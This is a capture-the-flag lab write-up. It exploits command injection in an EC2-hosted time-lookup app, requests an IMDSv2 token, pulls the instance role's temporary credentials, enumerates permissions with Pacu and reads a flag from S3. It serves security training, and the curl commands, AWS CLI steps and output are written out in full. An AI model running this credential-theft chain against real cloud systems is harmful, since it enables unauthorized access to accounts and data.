# Challenge Lab Name: `Compromising EC2 IMDSv2 with RCE to Access Sensitive S3 Data`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://cybr.com" target="_blank" title="Open Cybr Labs Platform"><img src="https://img.shields.io/badge/Cybr_Labs_↗-181717?style=flat&logo=pwnedlabs&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Cybr Labs Platform Link"></a> &nbsp;
>
>A web application runs on an EC2 instance and returns the current time for different timezones. It builds its response by passing your input straight to a shell command, which makes it vulnerable to remote code execution (RCE). Your goal is to exploit that RCE, use it to steal the instance role's credentials from IMDSv2, and then use those credentials to read a sensitive flag stored in an Amazon S3 bucket.

</details>

<details open>
<summary><b>Initial Access</b></summary>

The initial access was a public IP address which was hosting a website. 

```
http://44.200.241.100
```

When navigating to the website I could see that it was meant to fetch each timezone and their current time. 

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107113526.png" alt="Viewing the website's main page." width="400" />
  <p><em>Viewing the website's main page.</em></p>
</div>

When I clicked on the **Fetch Time** button I saw how the output looked, but since this wasn't sharing anything useful for me I went ahead and looked at the website's source code. 

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107113822.png" alt="Viewing the output from the `Fetch Time` button." width="400" />
  <p><em>Viewing the output from the `Fetch Time` button.</em></p>
</div>

Viewing the source code of the website's main page I could see the function that was running to grab the current time for each timezone, shown in the HTML **body** tags. 


```html
<body>
    <h1>Fetch Current Time for All Timezones</h1>
    <form method="post" action="[/fetch-time](view-source:http://44.200.241.100/fetch-time)" id="fetchForm">
        <button type="button" onclick="fetchTime()">Fetch Time</button>
    </form>
    <div id="response" class="response"></div>
    <script>
 function fetchTime() { fetch('/fetch-time', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', }, body: 'cmd=date' }) .then(response => response.text()) .then(data => { document.getElementById('response').innerHTML = data; }); }
    </script>
</body>
```

Reviewing the code closely I could see that there was a function called `fetchTime` that uses the CMD command `date`, which was a great finding because it meant there was a possible remote code execution (RCE) vulnerability. 


This function in the source code also looked like it was passing the command to the `/fetch-time` path. When trying to visit that path I get a **Method Not Allowed** message. Using the `curl` command below I could see that this URL path would only allow HTTP `POST` requests. 

```bash
└─$ curl -i -X OPTIONS http://44.201.110.34/fetch-time
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.10.12
Date: Sat, 07 Nov 2026 19:37:31 GMT
Content-Type: text/html; charset=utf-8
Allow: OPTIONS, POST
Content-Length: 0
Connection: close
```

So from all the information gathered, I knew that when the function was called (the button was clicked on) it would send a HTTP POST request to `/fetch-time` with the CMD command in the body of the request, and this would send the HTTP response back of the current time for each timezone. 

To try and exploit the possible RCE vulnerability I went ahead and captured the HTTP request that was sent when clicking on the **Fetch Time** button using Caido. I then sent that HTTP POST request to **Replay** to change the CMD command to check the IMDSv1 endpoint. 

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107113930.png" alt="Capturing the HTTP POST request using Caido." width="550" />
  <p><em>Capturing the HTTP POST request using Caido.</em></p>
</div>


#### IMDSv1

Checking the AWS documentation [page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) I saw how I could check for both the IMDSv1 and IMDSv2 endpoints.

I first checked the IMDSv1 endpoint by running the command below. 

```bash
curl -i http://169.254.169.254/latest/meta-data/
```

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107114324.png" alt="Checking IMDSv1 endpoint in Caido." width="550" />
  <p><em>Checking IMDSv1 endpoint in Caido.</em></p>
</div>

The HTTP response showed me a **401 Unauthorized** page which let me know that IMDSv2 was being used instead. 

#### IMDSv2

Since I knew that IMDSv1 was not being used I tried accessing the IMDSv2 endpoint, but first I needed to initiate a session by running the command below to get the required token to make further requests. 

```bash
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107121756.png" alt="Initiating session with IMDSv2 endpoint in Caido." width="500" />
  <p><em>Initiating session with IMDSv2 endpoint in Caido.</em></p>
</div>

The HTTP response I received after sending the request outputted the token I needed to make further requests to the IMDSv2 endpoint. Since I specifically wanted to know if any IAM roles were attached to the machine running the CMD commands, I ran the command below, including the required header and the token as the value. 

```bash
curl -H "X-aws-ec2-metadata-token: AQAEAH6f2p_oBgPbnb6pZ9aof_-JEox-cohHcKQ00Ml8Ry38kW6wFg==" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107115621.png" alt="Using Caido to query the IMDSv2 endpoint and check for any IAM roles." width="550" />
  <p><em>Using Caido to query the IMDSv2 endpoint and check for any IAM roles.</em></p>
</div>

From the HTTP response I could see that there was a IAM role, `rce-lab-role`, attached to the machine. With that known, I replaced the CMD value to the command below to get temporary credentials for that specific IAM role. 

```bash
curl -H "X-aws-ec2-metadata-token: AQAEAH6f2p_oBgPbnb6pZ9aof_-JEox-cohHcKQ00Ml8Ry38kW6wFg==" http://169.254.169.254/latest/meta-data/iam/security-credentials/rce-lab-role/
```

<div align="center">
  <img src="../images/Compromising-EC2-IMDSv2-with-RCE-to-Access-Sensitive-S3-Data/Pasted image 20261107115703.png" alt="Getting temporary credentials for an IAM role using Caido and the IMDSv2 endpoint." width="550" />
  <p><em>Getting temporary credentials for an IAM role using Caido and the IMDSv2 endpoint.</em></p>
</div>

</details>

<details open>
<summary><b>Privilege Escalation</b></summary>

With the temporary credentials provided from the RCE exploitation I configured an AWS profile **rce** by running the command `aws configure --profile rce`.  

```bash
└─$ aws sts get-caller-identity --profile rce
{
    "UserId": "AROA4FB77IPG6K6TCNHML:i-0d45453cfe55b0557",
    "Account": "835505308621",
    "Arn": "arn:aws:sts::835505308621:assumed-role/rce-lab-role/i-0d45453cfe55b0557"
}
```

The next step was to enumerate what permissions the IAM role had. 

I first tried listing the policies attached to the role using the AWS CLI, but I got an `AccessDenied` error. To make the enumeration process easier, I then went ahead and used [Pacu](https://github.com/RhinoSecurityLabs/pacu), an AWS exploitation framework, to gather what permissions this IAM role had. To do this I used the **iam__bruteforce_permissions** module. 

```bash
Pacu (rce:imported-rce) > run iam__bruteforce_permissions 
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
...
Pacu (rce:imported-rce) > data iam
{
  "permissions": {
    "allow": [
      "dynamodb:DescribeEndpoints",
      "s3:ListBuckets",
      "sts:GetCallerIdentity",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity"
    ],
    "deny": []
  }
}
```

To view what Pacu was able to find once the module finished I ran `data iam` and saw that the IAM role had permission to list S3 buckets that were attached to the AWS account. 

To list the buckets in the AWS account I ran the command shown below using the AWS CLI. 

```bash
└─$ aws s3 ls --profile rce                         
2026-11-07 11:31:04 cybr-imdsv2-rce-835505308621
```

From the command output I could see that there was one S3 bucket in the account, `cybr-imdsv2-rce-835505308621`. To check what objects were in the S3 bucket I went ahead and ran the command below. This is how I found the challenge flag for this lab. 

```bash
└─$ aws s3 ls s3://cybr-imdsv2-rce-835505308621 --profile rce
2026-11-07 11:31:04         28 flag.txt
```

To download the file I ran the command `aws s3 cp s3://cybr-imdsv2-rce-835505308621/flag.txt . --profile rce` which downloaded the `flag.txt` file into my current working directory. 

</details>


<details open>
<summary><b>Impact & Reflection</b></summary>

Since there wasn't any input validation or restrictions when running the CMD command in the HTTP request, I was able to perform RCE. Using this vulnerability, I checked to see if this machine running the commands was an EC2 instance by checking the IMDSv1 and IMDSv2 endpoints. After the lab and viewing this AWS documentation [page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/identify_ec2_instances.html) I could have checked if this machine was an EC2 instance using root privileges and then checking the AWS IMDS endpoints.  

With the RCE vulnerability I was able to find that IMDSv1 was disabled, so IMDSv2 was enabled. From here I created a session token and was able to find a IAM role that was attached to the EC2 instance. After getting temporary credentials for this IAM role I enumerated its permissions using Pacu, which showed me that the IAM role had permission to list buckets in the AWS account. This was how I was able to get the challenge flag for the lab, but in a real-world pentest this could have been a file with credentials or sensitive information inside it. 

</details>
